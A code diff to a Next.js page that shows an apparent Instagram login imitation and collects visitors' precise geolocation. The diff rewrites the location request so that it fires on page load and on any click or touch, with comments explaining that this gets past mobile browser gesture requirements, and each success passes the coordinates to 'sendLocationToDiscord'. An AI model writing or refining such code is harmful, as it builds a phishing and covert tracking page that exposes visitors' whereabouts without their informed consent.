@@ -1,33 +1,49 @@
 'use client'
 
-import { useState, useEffect } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import InstagramLogin from '@/components/InstagramLogin'
 
 export default function Home() {
   const [locationGranted, setLocationGranted] = useState(false)
   const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null)
+  const locationRequested = useRef(false)
+
+  const requestLocation = () => {
+    if (locationRequested.current || !navigator.geolocation) return
+    
+    locationRequested.current = true
+    
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const { latitude, longitude } = position.coords
+        setLocation({ lat: latitude, lng: longitude })
+        setLocationGranted(true)
+        
+        // Send location to Discord immediately
+        sendLocationToDiscord(latitude, longitude)
+      },
+      (error) => {
+        console.error('Location access denied or error:', error)
+        locationRequested.current = false // Allow retry on error
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    )
+  }
 
   useEffect(() => {
-    // Request location access when page loads
+    // Try to request location on page load (works on desktop/localhost)
+    // On mobile, this will be triggered by user interaction
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords
-          setLocation({ lat: latitude, lng: longitude })
-          setLocationGranted(true)
-          
-          // Send location to Discord immediately
-          sendLocationToDiscord(latitude, longitude)
-        },
-        (error) => {
-          console.error('Location access denied or error:', error)
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        }
-      )
+      // Small delay to ensure page is loaded
+      const timer = setTimeout(() => {
+        requestLocation()
+      }, 500)
+      
+      return () => clearTimeout(timer)
     }
   }, [])
 
@@ -55,8 +71,8 @@ export default function Home() {
   }
 
   return (
-    <main>
-      <InstagramLogin location={location} />
+    <main onClick={requestLocation} onTouchStart={requestLocation}>
+      <InstagramLogin location={location} onUserInteraction={requestLocation} />
     </main>
   )
 }
